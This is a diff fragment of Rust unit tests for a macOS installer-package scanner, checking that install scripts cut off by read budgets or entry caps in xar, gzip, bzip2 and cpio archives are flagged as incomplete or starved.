+        gz.extend([0x02, 0x08, 0x20, 0x80, 0x00].repeat(1000));
+        gz.push(0b001);
+        gz.extend_from_slice(&n.to_le_bytes());
+        gz.extend_from_slice(&(!n).to_le_bytes());
+        gz.extend_from_slice(&cpio);
+        gz.extend_from_slice(&crate::inflate::crc32(&cpio).to_le_bytes());
+        gz.extend_from_slice(&(cpio.len() as u32).to_le_bytes());
+        assert!(gz.len() < 20_000);
+        let (d, incomplete) = run(&gz);
+        assert!(d.contains(STARVED), "{d}");
+        assert!(incomplete);
+        // Junk after it, past the share, is not stream input.
+        gz.extend_from_slice(&[0x55; 30_000]);
+        let (d, incomplete) = run(&gz);
+        assert!(d.contains(STARVED), "{d}");
+        assert!(incomplete);
+    }
+
+    /// A bzip2 `Scripts` is still cut at the entry cap, and that is reported.
+    #[test]
+    fn a_bzip2_scripts_cut_at_the_entry_cap_is_reported() {
+        let pkg = include_bytes!(
+            "../../fixtures/suspicious/installer_scripts_bzip2_preinstall_behind_large_member.pkg"
+        );
+        let (r, c) = evaluate_small(pkg, &xar::XarLimits::default());
+        let d = r.expect("runs").expect("finding").description;
+        assert_eq!(d, format!("{STARVED} (1 component)"));
+        assert!(c.marked_incomplete("installer-script-suspicious"));
+    }
+
     /// A product archive whose components hold `blobs` as their `Scripts`, all
     /// named by its `Distribution` if `reachable`, else none.
     fn components_archive(blobs: &[Vec<u8>], reachable: bool) -> Vec<u8> {
@@ -3894,8 +4416,10 @@ mod tests {
         assert!(matches!(r, Ok(None)), "{r:?}");
     }
 
+    /// A corrupt `Scripts`, or a large member that is not a script, is
+    /// unreadable but not reported.
     #[test]
-    fn a_scripts_cut_by_the_entry_cap_or_corruption_is_not_reported() {
+    fn a_scripts_cut_by_corruption_or_a_large_member_is_not_reported() {
         let limits = xar::XarLimits {
             max_entry_bytes: 4096,
             max_read_back_bytes: 1 << 20,
@@ -3903,20 +4427,31 @@ mod tests {
         };
         let mut truncated = benign_scripts(1000);
         truncated.truncate(truncated.len() - 100);
-        for odd in [benign_scripts(8000), truncated] {
+        let large = scripts_of(&[
+            ("payload.bin", &[b'x'; 8000][..]),
+            ("preinstall", b"exit 0\n"),
+        ]);
+        for odd in [large, truncated] {
             let blobs = [benign_scripts(1000), odd];
             let (r, _) = evaluate_small(&components_archive(&blobs, true), &limits);
             assert!(matches!(r, Err(RuleOutcome::NotApplicable)), "{r:?}");
         }
-        // A flat package's one Scripts over the whole budget is not starved by peers.
-        let tight = xar::XarLimits {
-            max_read_back_bytes: 2048,
-            ..limits
+    }
+
+    /// Components whose shares stop their `Scripts` before the cpio trailer
+    /// are reported (#112, #123).
+    #[test]
+    fn starved_components_are_reported() {
+        let limits = xar::XarLimits {
+            max_entry_bytes: 4096,
+            max_read_back_bytes: 1 << 20,
+            ..xar::XarLimits::default()
         };
-        let mut heap = Heap::default();
-        let toc = file("Scripts", heap.add(&benign_scripts(1000)));
-        let (r, _) = evaluate_small(&archive(&toc, &heap), &tight);
-        assert!(matches!(r, Err(RuleOutcome::NotApplicable)), "{r:?}");
+        let blobs = [benign_scripts(1000), benign_scripts(8000)];
+        let (r, c) = evaluate_small(&components_archive(&blobs, true), &limits);
+        let signal = r.expect("runs").expect("finding");
+        assert_eq!(signal.description, format!("{STARVED} (2 components)"));
+        assert!(c.marked_incomplete("installer-script-suspicious"));
     }
 
     /// Each of the fixture's `Scripts` reads clean on its own budget, through
@@ -3939,14 +4474,26 @@ mod tests {
             .collect();
         assert_eq!(scripts.len(), 2048);
         for entry in [scripts[0], scripts[2047]] {
-            let mut bytes = CollectedScripts::default();
+            let mut sink = FirstBytes::default();
             let read = xar::ReadBudget::new(&limits)
-                .read_entry_nested(pkg, &archive, entry, &mut bytes)
+                .read_entry_nested(pkg, &archive, entry, &mut sink)
                 .expect("reads");
             assert_eq!(read.gap, None);
-            let members = cpio::parse(&bytes.first, &cpio::CpioLimits::default()).expect("cpio");
+            let members = cpio::parse(&sink.0, &cpio::CpioLimits::default()).expect("cpio");
             assert!(members.is_complete());
             assert!(members.entries.iter().any(|m| m.name == "preinstall"));
         }
+    }
+
+    /// Collects what a nested read sends to [`xar::NestedSink::first`].
+    #[derive(Default)]
+    struct FirstBytes(Vec<u8>);
+
+    impl xar::NestedSink for FirstBytes {
+        fn first(&mut self, bytes: &[u8]) {
+            self.0.extend_from_slice(bytes);
+        }
+
+        fn later(&mut self, _: &[u8]) {}
     }
 }
